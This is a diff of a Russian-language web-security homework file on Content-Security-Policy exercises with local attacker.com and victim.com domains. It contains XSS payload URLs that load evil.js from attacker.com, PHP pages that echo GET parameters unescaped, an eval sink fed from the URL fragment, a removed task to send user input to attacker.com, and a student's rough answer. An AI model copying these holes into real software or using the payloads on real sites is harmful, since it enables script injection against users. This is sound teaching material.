@@ -2,18 +2,76 @@
 
 Пожалуйста, пишите в названии pdf файла домашнего задания своё имя.
 
-1.Создать страницу javascript.html с кнопкой, при нажатии на которую появлялся алерт с текстом JavaScript is magiс!
-2. Написать функцию на языке JavaScript, которая будет создавать тег с картинкой и вставлять картинку в HTML.
-3. Создать файл array.json и разместить его в корневом каталоге своего сервера.
-Содержимое файла array.json:
-{
-  “summe”: [10, 0, -2, 114, 125]
-}
-Написать программу на языке JavaScript, которая будет делать XHR запрос на http://localhost/array.json, парсить полученный JSON и выводить сумму чисел массива summe.
-4. (*)Защититься от выполнения JavaScript кода на victim.com/xss.php?text=<script>alert(1)</script> (код страницы ниже) с помощью HTML энкодинга.
+1. Открыть консоль браузера на http://attacker.com и запросить файл с http://victim.com с помощью XHR. Изучить реакцию браузера в консоли.
+2. Примечание: домены attacker.com и victim.com должны резолвиться в 127.0.0.1, конфиг nginx тоже должен отдавать все так, чтобы на начало задания работало оба алерта.
+Добавить данную политику CSP на сайте http://victim.com. Загрузить страницу victim.com/csp.php?js=<script/src=//attacker.com/evil.js></script>, посмотреть что произошло. Исправить политику CSP так, чтобы вредоносный код не выполнялся.
+Файл csp.php
 <body>
+<h3>Whatever _malicious_ you inserted shouldn’t be executed!</h3>
 <?php
-  echo $_GET["text"];
+  echo $_GET[“js”];
 ?>
+<h3>But legitimate code still should execute</h3>
+<script src=”http://victim.com/some.js”></script>
 </body>
-5. (*) Написать функцию, которая будет сохранять ввод пользователя в переменную и отправлять значение переменной на http://attacker.com
+Политика CSP
+Content-Security-Policy: default-src ‘none’; script-src ‘unsafe-inline’ http:
+Файл some.js
+alert(“I’m legitimate!”)
+Файл evil.js
+alert(“I’m evil!”)
+
+3. Не дать вредоносному коду http://victim.com/hw-6-3.php?name=<script>alert(“hacked”)</script> выполниться на странице http://victim.com/hw-6-3.php (представлена ниже) с помощью политики CSP (написать политику CSP). Легитимный код при это должен выполняться.
+Страница hw-6-3.php
+<body>
+<h3>Whatever _malicious_ you inserted shouldn’t be executed!</h3>
+<?php
+  echo $_GET[“name”];
+?>
+<h3>But legitimate code still should execute</h3>
+<script src=”http://victim.com/some.js”></script>
+<script src=”http://sub.victim.com/some.js”></script>
+</body>
+
+4. (*) Обойти политику CSP: script-src ‘unsafe-eval’ http://victim.com http://partner.com http://home.victim.com на странице http://victim.com/hw-6-4.html?text=123. Сделать безопасно, понять почему теперь безопасно.
+Файл hw-6-4.html
+<body>
+<h3>Legitimate code still should execute</h3>
+<script src="/hw-6-4.js"></script>
+</body>
+Файл hw-6-4.js
+function okFunction () {
+  alert("I'm legitimate!");
+}
+setTimeout(document.URL.split("#")[1], 1000);
+setTimeout(okFunction, 1000);
+
+5. (*) Установить bWAPP.
+
+-------------------------------
+Для проверки использовал phpstorm и именно там было сказано, что проблема с ковычками.
+Ну для начала само правило вот так запишем в конфиг nginx:
+
+add_header Content-Security-Policy: "default-src 'none'; script-src 'unsafe-inline';";
+или так:
+
+add_header Content-Security-Policy: "default-src 'none'; script-src 'unsafe-inline' http:;";
+
+Сам код напишем так:
+В первом алерте запишем так:
+
+alert("I’m legitimate!")
+
+Во втором алерте запишем так:
+
+alert("I’m evil!")
+
+После чего можно запускать.
+Чаще получается вот этот вариант:
+victim.com/csp.php?js=<script/src=//victim.com/evil.js></script>
+victim.com/csp.php?js=<script/src=//victim.com/some.js></script>
+
+Или вот так запускать:
+victim.com/csp.php?js=<script/src=//attacker.com/evil.js></script>
+victim.com/csp.php?js=<script/src=//attacker.com/some.js></script>
+---------------------------------
